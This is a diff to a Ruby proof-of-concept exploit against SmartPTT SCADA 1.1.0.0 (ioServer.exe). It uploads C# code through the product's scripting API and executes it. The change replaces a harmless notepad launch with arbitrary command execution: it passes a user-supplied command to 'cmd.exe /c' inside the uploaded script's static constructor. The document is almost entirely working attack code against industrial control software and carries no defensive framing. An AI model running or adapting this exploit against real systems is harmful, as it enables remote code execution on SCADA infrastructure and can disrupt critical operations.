@@ -1,13 +1,14 @@
 #!/usr/bin/env ruby -W0 
-# SmartPTT SCADA 1.1.0.0
-# Uploads a C# code and executes it via the scripting api.
+# SmartPTT SCADA 1.1.0.0 / ioServer.exe
+# Uploads some C# code and executes it via the scripting api.
 require 'rex'
 require 'rex/mime'
 
 host = ARGV[0]
+cmd  = ARGV[1] || 'calc.exe'
 
 def usage
- puts "[*] #{$0} <host>"
+ puts "[*] #{$0} <host> [cmd]"
  exit
 end
 
@@ -18,8 +19,6 @@ begin
 script = %Q|
 using System;
 using System.Diagnostics;
-using Engine;
-using Logging;
 
 namespace CustomScript
 {
@@ -27,8 +26,14 @@ namespace CustomScript
     {
         static CustomScript()
        {
-        System.Diagnostics.Process.Start("notepad");
-       }
+            using (Process hax = new Process())
+                {
+                    hax.StartInfo.UseShellExecute = true;
+                    hax.StartInfo.FileName = "cmd.exe";
+                    hax.StartInfo.Arguments = "/c #{cmd}";
+                    hax.Start();
+                }
+        }
     }
 } 
 |
@@ -104,7 +109,7 @@ data = sock.read_response()
        'script_guid' => @guid.last[0],
       },
     })
-   puts "[*] Executing #{name}..."
+   puts "[*] Executing #{name} with command '#{cmd}'..."
    sock.send_request(req)
    data = sock.read_response()
   end
